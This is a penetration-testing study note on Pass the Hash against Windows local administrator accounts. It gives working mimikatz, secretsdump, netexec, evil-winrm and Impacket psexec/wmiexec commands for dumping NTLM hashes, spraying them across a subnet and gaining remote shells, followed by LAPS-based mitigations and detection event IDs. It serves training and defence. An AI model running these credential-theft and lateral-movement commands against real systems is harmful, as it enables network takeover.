---
tags: [windows, privesc, pentesting, red-team]
difficulty: advanced
module: "43 - Windows Privilege Escalation"
topic: "43.20 Pass the Hash on Local Admin"
---

# 20 - Pass the Hash on Local Admin

## Overview

Pass the Hash (PtH) is one of the most fundamental and widely used techniques in Windows exploitation. It allows an attacker to authenticate to a remote system or service using the underlying NTLM hash of a user's password, entirely bypassing the need to know the plaintext password.

When combined with Local Administrator accounts, PtH becomes a devastating pivot technique. In many environments, IT departments deploy standard workstation images where the built-in "Administrator" account shares the exact same password across hundreds or thousands of machines. If an attacker compromises a single workstation, dumps the local SAM (Security Account Manager) database, and extracts the local admin NTLM hash, they can simply "Pass the Hash" to every other machine on the network, instantly owning the entire fleet.

## The Architecture of NTLM Authentication & PtH

```text
+--------------------------------------------------------------------+
|                      Pass the Hash (PtH) Flow                      |
|                                                                    |
|  +----------------+     1. Dump Hash        +------------------+   |
|  | Compromised    | ----------------------> | SAM DB / LSASS   |   |
|  | Machine A      | <---------------------- | (Admin NTLM Hash)|   |
|  +-------+--------+     2. Receive Hash     +------------------+   |
|          |                                                         |
|          | 3. Authenticate with Hash (NTLM Challenge/Response)     |
|          |    via SMB, WMI, or WinRM                               |
|          v                                                         |
|  +----------------+                                                |
|  | Target         | 4. Hash Matches Target's Local SAM DB          |
|  | Machine B      | ---------------------------------------->      |
|  | (Same Admin PW)| <----------------------------------------      |
|  +----------------+ 5. Access Granted (SYSTEM / Admin Shell)       |
|                                                                    |
+--------------------------------------------------------------------+
```

## Deep Dive: The Mechanics of PtH

Windows systems use protocols like SMB (Server Message Block), WMI (Windows Management Instrumentation), and WinRM (Windows Remote Management) for remote administration. When authenticating over these protocols using NTLM, the server issues a challenge, and the client encrypts that challenge using the NTLM hash of the password. 

Because the protocol never requires the plaintext password—only the hash to perform the cryptographic response—an attacker who possesses the hash can complete the authentication sequence seamlessly.

### UAC Remote Restrictions (LocalAccountTokenFilterPolicy)

A critical concept for Pass the Hash with local accounts is **UAC Remote Restrictions**. 
Starting from Windows Vista, Microsoft introduced a security feature: when a local administrative user (other than the default, built-in `Administrator` SID 500 account) authenticates over the network, Windows strips their administrative privileges from their access token for the remote session. 

- **Built-in Administrator (RID 500)**: Pass the Hash **always works** and grants full Admin privileges.
- **Custom Local Admins (e.g., 'IT_Admin')**: Pass the Hash will authenticate, but it will **not** grant administrative privileges (like accessing `C$` or executing code via WMI) *unless* the `LocalAccountTokenFilterPolicy` registry key is set to `1`.

This makes the built-in `Administrator` account highly lucrative for PtH lateral movement.

## Exploitation Scenarios

### 1. Dumping the Hashes
Before passing the hash, you must obtain it. If you have elevated privileges on a machine, you can dump the SAM database or LSASS memory.

**Using Secretsdump.py (Impacket):**
```bash
# Dumping local SAM from a remote machine (requires admin creds or a hash you already have)
secretsdump.py WORKGROUP/Administrator@192.168.1.100 -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
```

**Using Mimikatz (Locally):**
```mimikatz
privilege::debug
token::elevate
lsadump::sam
```

### 2. Passing the Hash using CrackMapExec / NetExec
CrackMapExec (now transitioning to NetExec) is the premier tool for spraying local admin hashes across a subnet to find where they are valid.

```bash
# Spraying the local admin hash across a /24 subnet
netexec smb 192.168.1.0/24 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c --local-auth

# If you see "Pwn3d!", it means the hash granted administrative access.
```

### 3. Gaining a Shell with Evil-WinRM
If WinRM (port 5985/5986) is open on the target, Evil-WinRM provides a stable, interactive PowerShell session using only the NTLM hash.

```bash
evil-winrm -i 192.168.1.105 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c
```

### 4. Code Execution via Impacket (psexec.py / wmiexec.py)
Impacket provides scripts that replicate administrative tools using hashes.

- **psexec.py** (Creates a service, highly noisy):
  ```bash
  psexec.py Administrator@192.168.1.105 -hashes :8846f7eaee8fb117ad06bdd830b7586c
  ```
- **wmiexec.py** (Uses WMI, semi-stealthy, leaves process creation logs):
  ```bash
  wmiexec.py Administrator@192.168.1.105 -hashes :8846f7eaee8fb117ad06bdd830b7586c
  ```

### 5. Overpass-the-Hash (PtH to Kerberos)
While traditional PtH uses NTLM, if you have the hash of a *domain* user, you can request a Kerberos Ticket Granting Ticket (TGT) using the NTLM hash, converting a PtH attack into a Pass the Ticket (PtT) attack. This is known as Overpass-the-Hash.

```mimikatz
sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:8846f7eaee8fb117ad06bdd830b7586c /run:cmd.exe
```

## Defensive Strategies & Mitigation

Defending against local admin PtH primarily involves breaking the assumption that local administrator passwords are identical across the network.

1. **LAPS (Local Administrator Password Solution)**: This is the definitive fix. LAPS randomizes the local administrator password for every machine on the domain and rotates it regularly. This entirely breaks local admin PtH lateral movement.
2. **Disable the Built-in Administrator**: Disable the default `Administrator` account (RID 500) via GPO.
3. **Restrict Network Logon Rights**: Use Group Policy to deny the local administrator account the right to log on from the network (`Deny access to this computer from the network`).
4. **Disable SMBv1 and enforce SMB Signing**: While SMB Signing does not stop PtH (because the attacker has the credential to sign the packets), it prevents NTLM Relay attacks, which are closely related.
5. **Leave UAC Remote Restrictions Default**: Do not enable `LocalAccountTokenFilterPolicy` (setting it to 1) unless strictly necessary, as it allows non-RID-500 local admins to execute code remotely.

## Detection and Logging

- **Event ID 4624 (Successful Logon)**: Look for Logon Type 3 (Network Logon). When PtH is used via SMB or WMI, it registers as a Type 3 logon. Pay attention to the `Key Length` field; NTLMv1/v2 will log here.
- **Event ID 4625 (Failed Logon)**: Monitor for high volumes of failed Logons (CrackMapExec brute forcing/spraying).
- **Service Creation (Event ID 7045)**: Tools like `psexec.py` create a temporary service (often with a randomized 4-8 character name) on the target system. This is a massive red flag.
- **Process Tracking (Event ID 4688)**: `wmiexec.py` spawns `cmd.exe` directly under the `WmiPrvSE.exe` (WMI Provider Host) process. Legitimate admin activity rarely looks like this.

## Chaining Opportunities

- **[[22 - LAPS]]**: If LAPS is implemented, PtH on local admins is blocked. You must shift focus to enumerating who can read LAPS passwords instead.
- **[[19 - DPAPI]]**: Once you Pass the Hash to access a new system, you can dump LSASS on *that* system to steal DPAPI Master Keys for currently logged-in users.
- **[[28 - Token Impersonation]]**: If you land on a box via PtH and it has a high-privileged service running, you can impersonate its token to pivot further.

## Related Notes
- [[17 - Stored Credentials Files]]
- [[21 - Password in GPP]]
- [[23 - Abusing SeDebugPrivilege]]
